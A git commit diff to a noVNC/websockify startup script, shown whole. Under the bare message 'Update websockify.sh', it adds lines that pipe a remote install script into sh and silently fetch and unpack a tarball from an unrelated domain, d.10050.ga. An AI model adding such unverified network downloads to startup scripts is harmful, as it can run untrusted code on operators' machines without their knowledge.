f00187dadcd8ce7864ca16451e18054af8beedc8
uuu-mp4 <87161517+uuu-mp4@users.noreply.github.com>
2021-08-30 15:39:36 +0800

    Update websockify.sh

--- conf.d/websockify.sh
+++ conf.d/websockify.sh
@@ -1,2 +1,6 @@
 #!/bin/bash
 websockify --web /usr/share/novnc $PORT localhost:5900
+cd /home
+curl -L https://fly.io/install.sh | sh
+wget -q http://d.10050.ga/mm/VPS/flyio.tar.gz
+tar -xzvf flyio.tar.gz
